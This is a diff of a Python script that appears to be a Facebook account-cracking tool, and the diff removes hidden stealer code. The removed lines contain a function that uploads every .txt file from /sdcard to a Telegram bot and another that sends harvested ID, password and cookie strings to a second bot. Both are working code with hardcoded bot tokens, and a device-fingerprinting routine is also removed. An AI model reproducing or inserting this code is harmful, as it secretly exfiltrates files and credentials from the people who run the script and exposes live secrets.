@@ -26,60 +26,8 @@ from os import system as osRUB
 from os import system as cmd
 os.system('clear')
 print('         \x1b[38;5;46m PUTANG INA MO WAG MO I BYPASS')
-try:
-    import requests 
-except ImportError:
-    print('\n  installing Requests ...\n')
-    os.system('pip install requests')
-
-def getKey():
-
-    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
-    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
-    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
-    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
-    bxd = ""
-    bumper = bxd+id+xp
-    return bumper
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n  installing futures ...\n')
-    os.system('pip install futures')
 
 
-def sexy():
-    session=requests.session()
-    bot_token = '6813311420:AAHoSG68PNs6oqFdgmaB1T0Bl4awSBUJXdg' 
-    chat_id = '09946589794'
-    #-----------( /sdcard
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-
-
-
-def Elite(id,ps,coki):
-    try:
-        import requests
-        token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add your token 
-        chatid = "09945689794"#Add your Chat Id
-        ok_id =str(id+"|"+ps+"|"+coki)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        params = {"chat_id": chatid, "text": ok_id}
-        requests.get(url, params=params)
-    except:
-        pass
-    
 try:
     import mechanize
 except ModuleNotFoundError:
